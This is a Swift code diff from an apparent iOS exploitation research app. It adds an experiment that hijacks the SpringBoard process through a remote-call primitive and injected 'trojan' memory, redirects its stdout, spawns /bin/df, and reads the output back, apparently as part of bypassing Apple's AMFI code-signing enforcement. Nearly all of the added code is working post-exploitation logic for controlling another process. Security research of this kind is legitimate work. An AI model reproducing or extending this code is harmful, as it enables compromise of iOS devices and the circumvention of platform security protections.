@@ -333,6 +333,13 @@ struct AMFIExperimentView: View {
             let exp34 = self.expPipeBeforeSpawn(rc: rc)
             experimentResults.append(exp34)
             
+            // ============================================
+            // Experiment 35: Spawn from SPRINGBOARD context (not launchd)
+            // SpringBoard is not PID 1 — pointer writes might work!
+            // ============================================
+            let exp35 = self.expSpawnFromSpringBoard()
+            experimentResults.append(exp35)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2220,7 +2227,94 @@ struct AMFIExperimentView: View {
     
     // MARK: - Output Capture Research (processes spawn but output empty)
     
-    /// PROVE binary execution by having it CREATE a file
+    /// Spawn from SpringBoard context instead of launchd
+    /// SpringBoard is uid=501 but NOT PID 1 — might handle pointers differently
+    /// Also: SpringBoard has different entitlements
+    private func expSpawnFromSpringBoard() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "spawn from SpringBoard", success: false, detail: "SpringBoard RC not available", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        let outFile = "/tmp/.dsp_sb_spawn_out"
+        let outAddr = remote_alloc_str(sb, outFile)
+        
+        // Delete old
+        RootExecutor.rcall(sb, "unlink", outAddr)
+        
+        // Open output file
+        let outFd = RootExecutor.rcall(sb, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        
+        // Save SpringBoard's stdout
+        let origStdout = RootExecutor.rcall(sb, "dup", 1)
+        
+        // Redirect stdout to file
+        RootExecutor.rcall(sb, "dup2", outFd, 1)
+        RootExecutor.rcall(sb, "dup2", outFd, 2)
+        
+        // Spawn /bin/df from SpringBoard
+        let binAddr = remote_alloc_str(sb, "/bin/df")
+        let argvBase = mem + 0x400
+        sb[argvBase].setValue64(binAddr)
+        sb[argvBase + 8].setValue64(0)
+        
+        let pidAddr = mem + 0x2E0
+        sb[pidAddr].setValue64(0)
+        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
+        let pid = sb[pidAddr].value32()
+        
+        // Restore stdout immediately
+        RootExecutor.rcall(sb, "dup2", origStdout, 1)
+        RootExecutor.rcall(sb, "dup2", origStdout, 2)
+        RootExecutor.rcall(sb, "close", origStdout)
+        RootExecutor.rcall(sb, "close", outFd)
+        
+        // Wait
+        RootExecutor.rcall(sb, "usleep", 2000000) // 2s
+        let statusAddr = mem + 0x380
+        let waitRet = RootExecutor.rcall(sb, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+        
+        // Read output file
+        var output = ""
+        let readFd = RootExecutor.rcall(sb, "open", outAddr, UInt64(O_RDONLY), 0)
+        var fileSize: UInt64 = 0
+        if readFd != UInt64(bitPattern: -1) {
+            fileSize = RootExecutor.rcall(sb, "lseek", readFd, 0, 2)
+            RootExecutor.rcall(sb, "lseek", readFd, 0, 0)
+            
+            if fileSize > 0 {
+                let bufAddr = mem + 0x800
+                let n = RootExecutor.rcall(sb, "read", readFd, bufAddr, min(fileSize, 2000))
+                if n > 0 && n < 2001 {
+                    var buf = [UInt8](repeating: 0, count: Int(n))
+                    sb.remoteRead(bufAddr, to: &buf, size: n)
+                    output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
+                }
+            }
+            RootExecutor.rcall(sb, "close", readFd)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(sb, "unlink", outAddr)
+        RootExecutor.rcall(sb, "free", outAddr)
+        RootExecutor.rcall(sb, "free", binAddr)
+        
+        let detail = """
+        Context: SpringBoard (uid=501, PID≠1)
+        posix_spawn(/bin/df): ret=\(ret), pid=\(pid)
+        waitpid(-1): \(waitRet)
+        output file size: \(fileSize)
+        output (\(output.count) chars):
+        \(output.prefix(500))
+        
+        If output here but not from launchd → launchd has special restrictions
+        If still empty → stdout redirect doesn't work via RC in general
+        """
+        
+        return ExperimentResult(name: "spawn from SpringBoard", success: !output.isEmpty, detail: detail, timestamp: Date())
+    }
+    
+    /// PROVE binary execution by creating a file
     /// Instead of capturing stdout, make the binary do something observable
     /// /bin/df writes to stdout — but what if we use /sbin/mount -t to create mount?
     /// Simpler: use touch-like behavior via spawn args
